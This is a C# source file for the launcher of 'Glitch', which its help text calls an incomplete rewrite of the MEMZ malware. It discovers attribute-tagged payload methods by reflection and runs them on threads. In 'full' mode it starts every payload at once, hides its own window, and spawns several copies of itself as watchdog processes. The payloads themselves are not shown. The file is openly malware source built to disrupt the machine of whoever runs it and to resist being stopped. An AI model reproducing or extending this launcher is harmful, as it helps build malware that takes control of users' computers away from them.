using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;
using GlitchPayloads;

//#define Watch_Dogs

namespace Glitch
{
    public class Program
    {
        private static readonly Random Rnd = new Random();
        public static List<MethodInfo>? payloads;

        public static void Main(string[] args)
        {
#if Watch_Dogs
            if (args.Length == 1 && args[0] == "wd")
            {
                WatchDog.Run();
                return;
            }
#endif
            args = args == null || args.Length == 0
                ? new[] {"form"}
                : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
            payloads = Assembly.GetAssembly(typeof(PayloadAttribute)).GetTypes()
                .Where(s => s.IsClass &&
                            s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                .SelectMany(s => s.GetMethods()).Where(s =>
                    !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
                .OrderBy(s => s.GetPayloadName())
                .ToList();
            switch (args[0])
            {
                case "form":
                    Application.Run(new RunGUI());
                    break;
                case "list":
                    Console.WriteLine(
                        string.Join(Environment.NewLine, payloads.Select(s => s.GetPayloadName())));
                    break;
                case "full":
                    payloads.ForEach(s => new Thread(() => s.Invoke(null, new object[0])).Start());
#if !Watch_Dogs
                    Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
                    for (int i = 0; i < WatchDog.WDC; i++)
                        Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
#else
                    ShowKill();
#endif
                    break;
                case "run":
                    Console.WriteLine("Using payloads:");
                    payloads.Where(s => args.Skip(1).Any(a => s.GetPayloadName().ToLower() == a)).ToList().ForEach(
                        s =>
                        {
                            Console.WriteLine($"- {s.GetPayloadName()}");
                            new Thread(() => s.Invoke(null, new object[0])).Start();
                        });
                    ShowKill();
                    break;
                case "help":
                    ShowHelp();
                    break;
                default:
                    Console.WriteLine("Invalid operator");
                    ShowHelp();
                    break;
            }
        }

        private static void ShowKill()
        {
            Console.WriteLine("Press [ENTER] to kill");
            Console.ReadLine();
            Environment.Exit(0);
        }

        private static void ShowHelp()
        {
            Console.WriteLine(@"CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#
Usage: Glitch <command> [parameters]

Commands:
-   form: Shows a GUI to customize payloads (Memz Clean). Default
-   help: Displays this message
-   list: Lists all payloads
-   full: Runs all payloads. This is the only option that includes WatchDogs
-   run:  Run only the payloads specified in parameters");
#if Watch_Dogs
            Console.WriteLine("-   wd:   This is used internally and should not be used from outside");
#endif
        }
    }
}

//TODO: Funciton to build custom payload collections
//TODO: Show notepad
//TODO: Test WD